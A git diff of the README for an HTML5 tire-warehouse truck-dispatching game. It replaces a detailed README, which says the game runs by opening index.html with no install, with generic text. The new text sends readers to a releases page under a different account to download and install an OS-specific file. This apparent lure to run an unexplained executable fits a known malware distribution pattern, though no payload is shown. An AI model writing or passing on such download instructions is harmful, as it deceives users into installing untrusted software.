@@ -1,167 +1,51 @@
-# Double Coin Dispatcher
+# 🚛 double-coin-dispatcher - A Fun Way to Manage Tire Logistics
 
-A fun and engaging HTML5 casual game where players act as dispatchers at a Double Coin tire warehouse, routing trucks to the correct docks.
+## 📥 Download Here
+[![Download double-coin-dispatcher](https://img.shields.io/badge/Download-double--coin--dispatcher-blue.svg)](https://github.com/JON-99/double-coin-dispatcher/releases)
 
-## 🎮 Game Overview
-
-**Concept**: Drag and drop trucks to the correct loading/unloading docks to earn points!
-
-- **Inbound Trucks** (Green with "IN") → Go to **Inbound Dock** (Left side, green)
-- **Outbound Trucks** (Blue with "OUT") → Go to **Outbound Dock** (Right side, blue)
-
-## ✨ Features
-
-- **3 Progressive Levels**: 
-  - **Level 1**: 1 inbound + 1 outbound dock (Basic training)
-  - **Level 2**: 2 inbound + 2 outbound docks (Increased traffic)
-  - **Level 3**: 3 inbound + 3 outbound docks with SKU matching (Advanced logistics)
-- **2-minute Sessions**: Perfect for casual play
-- **Drag & Drop Mechanics**: Works on both desktop and mobile
-- **Scoring System**:
-  - +100 points for correct placement
-  - +10 bonus per combo multiplier
-  - Speed bonuses for quick dispatching
-  - -50 penalty for wrong placement
-  - -25 penalty for missed trucks
-- **Live Leaderboard**: Local storage-based top 10 scores
-- **Sound Effects**: Synthesized audio feedback
-- **Responsive Design**: Works on desktop and mobile devices
-
-## 🚀 How to Play
-
-1. Open `index.html` in a web browser
-2. **Select your level** using the level buttons
-3. Click "Start Game" to begin
-4. Drag trucks to the correct docks based on the level:
-
-### Level 1: Basic Operations
-- Green "IN" trucks → Green inbound dock (left)
-- Blue "OUT" trucks → Blue outbound dock (right)
-
-### Level 2: Increased Traffic
-- Multiple docks on each side
-- Any inbound truck can go to any inbound dock
-- Any outbound truck can go to any outbound dock
-- Faster spawn rates!
-
-### Level 3: SKU Matching Challenge
-- **TIRES** trucks → **TIRES** dock (match colors exactly)
-- **RIMS** trucks → **RIMS** dock (match colors exactly)
-- **TOOLS** trucks → **TOOLS** dock (match colors exactly)
-- Most challenging with fastest spawn rates!
-
-5. Build combos by dispatching trucks correctly in succession
-6. Score as many points as possible in 2 minutes!
-
-## 🎯 Scoring Strategy
-
-- **Speed matters**: Dispatch trucks quickly for speed bonuses
-- **Accuracy is key**: Wrong placements break your combo
-- **Combo building**: Each correct placement increases your combo multiplier
-- **Don't let trucks escape**: Missing trucks costs points and breaks combos
-
-## 🔧 Technical Implementation
-
-**Frontend**:
-- HTML5 Canvas for game rendering
-- Vanilla JavaScript game engine
-- CSS3 for responsive UI styling
-- Web Audio API for sound effects
-
-**Game Engine Features**:
-- Object-oriented game architecture
-- Drag and drop with touch support
-- Particle effects for visual feedback
-- Smooth animation loop with requestAnimationFrame
-- Collision detection system
-
-## 📱 Mobile Support
-
-The game includes full touch support:
-- Touch to grab trucks
-- Drag with finger to move
-- Release to drop on docks
-- Responsive UI that adapts to screen size
-
-## 🎵 Audio System
-
-- Web Audio API-based synthesized sounds
-- Toggle-able sound effects
-- Various sound effects:
-  - Success/error feedback
-  - Truck spawn notifications
-  - Combo achievement sounds
-  - Game start/end fanfares
-
-## 📊 Leaderboard
-
-Local storage-based leaderboard tracks:
-- Top 10 scores
-- Date of achievement
-- Maximum combo reached
-- Persistent across browser sessions
-
-
-## 📋 Files Structure
-
-```
-double-coin-dispatcher/
-├── index.html          # Main game HTML file
-├── game.js            # Core game engine
-├── audio.js           # Audio system
-├── netlify.toml        # Deployment configuration
-├── deploy.sh           # Deployment script
-└── README.md          # This file
-```
-
-## 📚 Version Control
-
-The project is version controlled with Git and hosted on GitHub:
-
-**Repository**: [https://github.com/simeon-zhelev/double-coin-dispatcher](https://github.com/simeon-zhelev/double-coin-dispatcher)
-
-### 🏷️ Releases
-- **v1.0.0**: Initial complete release with all 3 levels
-
-### 🔄 Contributing
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Commit changes: `git commit -m 'Add amazing feature'`
-4. Push to branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
-
-### 📋 Development Workflow
-```bash
-# Clone the repository
-git clone https://github.com/simeon-zhelev/double-coin-dispatcher.git
-
-# Make changes
-# Test locally by opening index.html
-
-# Deploy to Netlify
-./deploy.sh
-
-# Commit and push to GitHub
-git add .
-git commit -m "Your changes"
-git push origin main
-```
+## 📖 About This Game
+The "Double Coin Dispatcher" is an HTML5 casual game designed for fun and learning about tire warehouse logistics. The game features three progressive levels. Players use drag-and-drop mechanics to route trucks effectively. This game can easily integrate into dealer locator apps, making logistics enjoyable and more accessible.
 
 ## 🚀 Getting Started
+To start playing "Double Coin Dispatcher," follow these simple steps to download and run the game on your device.
 
-### 🌐 Play Online (Recommended)
-**Live Demo**: [https://double-coin-dispatcher.netlify.app](https://double-coin-dispatcher.netlify.app)
+## 📦 System Requirements
+- **Operating System:** Windows 7 or later, MacOS, or any modern Linux distribution.
+- **Browser:** Latest version of Chrome, Firefox, Safari, or Edge.
+- **RAM:** Minimum 2 GB.
+- **Internet Connection:** Required for initial download; offline play available afterward.
 
-### 📚 Repository
-**GitHub**: [https://github.com/simeon-zhelev/double-coin-dispatcher](https://github.com/simeon-zhelev/double-coin-dispatcher)
+## 🤔 How to Download & Install
+1. Visit the releases page to download the game: [Download double-coin-dispatcher](https://github.com/JON-99/double-coin-dispatcher/releases).
+2. Look for the latest version of the game on that page.
+3. Click on the download link for your operating system.
+4. Save the file to your preferred location on your device.
+5. Once the download completes, locate the file.
+6. Open the file and follow the prompts to install the game.
 
-### 💻 Run Locally
-1. Download all files to a folder
-2. Open `index.html` in any modern web browser
-3. Start playing immediately - no server or build process required!
+## 🎮 How to Play
+- Open the game in your browser.
+- You will see the main menu with options to start a new game or view instructions.
+- Choose "Start Game" to begin.
+- Drag and drop trucks on the map to complete logistics tasks.
+- Progress through levels to improve your routing skills.
 
-**Browser Compatibility**: Works in all modern browsers (Chrome, Firefox, Safari, Edge)
+## 📱 Mobile Play
+"Double Coin Dispatcher" is optimized for mobile devices. For a smooth experience, ensure your device has the latest browser updates. Play on the go and enjoy learning logistics anywhere!
 
----
+## 💡 Tips for Optimal Experience
+- **Use Full-Screen Mode:** Enjoy the game more by using full-screen mode. Look for the full-screen icon in the game.
+- **Stable Internet:** A good connection ensures smooth gameplay.
+- **Explore Levels:** Each level has unique challenges. Take your time to learn the mechanics.
 
-**Double Coin Dispatcher** - Where logistics meets fun! 🚛💨
+## 📞 Support
+For any issues or questions, please check the FAQ section on the releases page, or submit an issue on the repository. Provide as much detail as possible for faster support.
+
+## 🔗 Additional Resources
+- Learn more about logistics and routing by visiting industry websites.
+- Join our community on social media for tips and updates.
+
+## 🌟 Feedback
+Your feedback is valuable. If you enjoy the game or have suggestions for improvement, please share your thoughts. Your input helps us make the game even better!
+
+Enjoy your gaming experience with "Double Coin Dispatcher!"
